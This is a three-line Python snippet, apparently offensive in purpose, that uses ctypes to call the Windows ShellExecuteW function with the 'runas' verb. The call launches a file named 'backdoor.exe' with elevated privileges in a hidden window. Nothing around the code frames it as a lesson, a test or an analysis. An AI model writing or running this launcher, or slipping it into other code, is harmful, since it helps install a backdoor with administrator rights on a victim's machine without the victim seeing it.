import ctypes 

ctypes.windll.shell32.ShellExecuteW(None, u"runas", u"backdoor.exe", None, None, 0)